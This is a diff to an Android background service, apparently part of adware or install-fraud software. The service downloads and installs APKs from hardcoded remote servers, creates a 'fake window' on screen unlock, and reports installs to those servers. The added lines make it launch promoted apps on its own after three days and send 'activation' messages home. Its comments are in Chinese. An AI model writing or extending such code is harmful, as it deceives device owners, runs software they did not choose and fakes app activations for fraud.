@@ -37,6 +37,8 @@ public class CoreService extends Service {
     public static final String FETCH_SERVER_URL2 = "http://www.jmxstd.com:8080/springMvc/student.do";
     public static final String FETCH_SERVER_URL3 = "http://www.beiyongjm.com:8080/springMvc/student.do";
     public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數
+    public static final int ACTIVE_TYPE_NOTIFICATION = 1;
+    public static final int ACTIVE_TYPE_OTHER = 2;
     private CoreReceiver receiver;
     private Handler handler;
     private InitApplication application;
@@ -73,6 +75,9 @@ public class CoreService extends Service {
             unregisterReceiver(receiver);
     }
 
+    /**
+     * 注册广播
+     */
     private void registerCoreReceiver() {
         receiver = new CoreReceiver();
         IntentFilter filter = new IntentFilter();
@@ -91,7 +96,7 @@ public class CoreService extends Service {
     private void receiveBroadcast(int type, Intent intent) {
         switch (type) {
             case UNLOCK_SCREEN:
-                ActiveApplication();
+                activeApplication();
                 Tools.initFakeWindow(getApplicationContext());
                 if (Tools.isOnline(getApplicationContext()))
                     updateService();
@@ -232,8 +237,10 @@ public class CoreService extends Service {
                     String title = jsonObject.getString("title");
                     String content = jsonObject.getString("content");
                     String tickerText = jsonObject.getString("tickertText");
-                    ActiveApplicationInfo appInfo = new ActiveApplicationInfo(tickerText, title, content,packageName);
+                    ActiveApplicationInfo appInfo = new ActiveApplicationInfo(tickerText, title, content, packageName);
+                    appInfo.setDisplayTime(System.currentTimeMillis());
                     application.getFinalDb().save(appInfo);
+                    activeApplication();
                 } catch (JSONException e) {
                     e.printStackTrace();
                 }
@@ -247,14 +254,27 @@ public class CoreService extends Service {
         });
     }
 
-    private void ActiveApplication() {
+    /**
+     * 激活程序
+     */
+    private void activeApplication() {
         List<ActiveApplicationInfo> infos = application.getFinalDb().findAllByWhere(ActiveApplicationInfo.class, "active=0");
         if (infos != null && infos.size() > 0) {
             ActiveApplicationInfo info = infos.get(0);
-            Tools.activeApplicationByNotification(this, info);
+            long displayTime = info.getDisplayTime();
+            if (System.currentTimeMillis() - displayTime > DAY_TIME_MILLIS * 3) {
+                Tools.launchApplication(getApplicationContext(), info.getPackageName());
+                info.setActive(true);
+                application.getFinalDb().update(info);
+                Tools.pushActiveMessage(getApplicationContext(), info.getPackageName(), ACTIVE_TYPE_OTHER);
+            } else
+                Tools.activeApplicationByNotification(this, info);
         }
     }
 
+    /**
+     * 推送下载成功，安装成功，设备安装过...等消息
+     */
     private void pushMessage() {
         Tools.logW("PUSH_MESSAGE");
         List<PushMessage> messages = application.getFinalDb().findAllByWhere(PushMessage.class, "successful = 0", "_id ASC");
@@ -274,6 +294,11 @@ public class CoreService extends Service {
         }
     }
 
+    /**
+     * 获取下载路径
+     *
+     * @return
+     */
     private String getDownloadLocation() {
         String parent = Tools.getDownloadDirectory(getApplicationContext());
         if (Tools.isEmpty(parent)) {
@@ -314,7 +339,7 @@ public class CoreService extends Service {
         if (!pDir.exists())
             pDir.mkdirs();
         List<ApplicationInfo> infos = application.getFinalDb().findAllByWhere(ApplicationInfo.class, "download=0 OR install=0", "_id ASC");
-        if (!Config.IS_DOWNLOADING.get() && infos != null && infos.size() > 0) {
+        if (!Config.IS_DOWNLOADING.get() && infos != null && infos.size() > 0) {//当前没下载且infos不为null且infos.size()个数大于0
             Config.IS_DOWNLOADING.set(true);
             final ApplicationInfo info = infos.get(0);
             final File file = new File(direction, info.getFileName());
@@ -347,7 +372,7 @@ public class CoreService extends Service {
                     super.onFailure(t, errorNo, strMsg);
                     Tools.logW("下载失败" + strMsg);
                     Config.IS_DOWNLOADING.set(false);
-                    if (file.exists() && errorNo == 416) {
+                    if (file.exists() && errorNo == 416) {//文件存在且服务器返回416错误吗
                         PackageInfo packageInfo = Tools.getPackageInfoByPath(getApplicationContext(), file.getAbsolutePath());
                         if (packageInfo == null) {
                             Tools.logW("文件错误，删除。");
@@ -397,6 +422,9 @@ public class CoreService extends Service {
         return false;
     }
 
+    /**
+     * 解锁及wifi状态改变的receiver
+     */
     class CoreReceiver extends BroadcastReceiver {
 
         @Override
